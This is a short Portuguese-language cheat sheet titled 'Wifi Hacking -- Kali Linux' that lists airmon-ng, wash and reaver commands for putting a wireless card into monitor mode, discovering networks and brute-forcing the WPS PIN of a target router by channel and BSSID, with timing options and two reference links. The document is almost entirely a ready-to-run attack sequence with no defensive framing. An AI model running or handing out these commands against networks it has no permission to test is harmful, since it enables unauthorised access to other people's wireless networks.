# Wifi Hacking -- Kali Linux
### (by Walysson dos Reis)
---------------------
### WPS Cracking com Reaver
* `airmon-ng check kill` - Interrompe processos que estejam utilizando a placa wifi
* `airmon-ng start wlan0` - Coloca a interface wifi wlan0 em modo de monitoramento
* `wash -i wlan0mon` - Ativa descoberta de redes disponivel na interface wlan0mon
* `reaver -i mon0 -c 1 -b 00:00:00:00:00:00 -vv` - Inicie o reaver inserindo interface, canal e bssid da rede alvo
* `reaver -i mon0 -c 1 -b 00:00:00:00:00:00  -vv -L -N -d 15 -T .5 -r 3:15` - Reavear com parâmetros de intervalo opcional


--------
## Referências
https://outpost24.com/blog/wps-cracking-with-reaver  
https://cienciacomputacao.com.br/tutorial/como-hackear-wi-fi-wpa2-psk-com-kali-linux/  

